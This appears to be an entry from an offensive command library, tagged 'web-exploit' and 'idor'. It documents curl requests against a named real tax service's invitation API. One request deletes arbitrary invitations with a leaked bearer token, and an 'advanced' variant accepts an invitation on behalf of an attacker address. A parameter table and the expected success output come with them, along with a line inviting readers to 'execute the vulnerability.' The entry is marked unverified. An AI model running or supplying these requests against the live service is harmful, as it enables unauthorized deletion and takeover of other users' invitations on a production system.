---
id: cmd-uuid-1
data: >-
  curl -X POST https://app.taxjar.com/api/invitations/INVITE_ID/delete -H
  "Authorization: Bearer TOKEN" -H "Content-Type: application/json"
tags:
  - web-exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.303Z'
verified: false
validated: true
submitted: true
---
# curl-delete-taxjar-invite

## Command

```bash
curl -X POST https://app.taxjar.com/api/invitations/INVITE_ID/delete \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json"
```

## Description

This curl command sends a POST request to Taxjar's delete invitation endpoint, exploiting the IDOR by using a leaked token to delete an arbitrary invitation ID without ownership validation. Use it to test or execute the vulnerability in a web-based attack scenario.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `INVITE_ID` | The target invitation ID to delete (can be arbitrary due to IDOR) | Yes |
| `TOKEN` | Leaked invite token used as Bearer auth | Yes |
| `-X POST` | HTTP method for deletion | Yes |
| `-H "Authorization: Bearer TOKEN"` | Auth header with the token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.taxjar.com/api/invitations/12345/delete \
  -H "Authorization: Bearer abcdef123456" \
  -H "Content-Type: application/json"
```

### Advanced Usage

For manipulation (adapt endpoint):

```bash
curl -X POST https://app.taxjar.com/api/invitations/12345/accept \
  -H "Authorization: Bearer abcdef123456" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@example.com"}'
```

## Expected Output

Successful exploitation returns a 200 OK with JSON like {"message": "Invitation deleted successfully"}. Failure due to invalid token shows 401 Unauthorized; IDOR success lacks organization errors.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Taxjar-Invite-Deletion]]
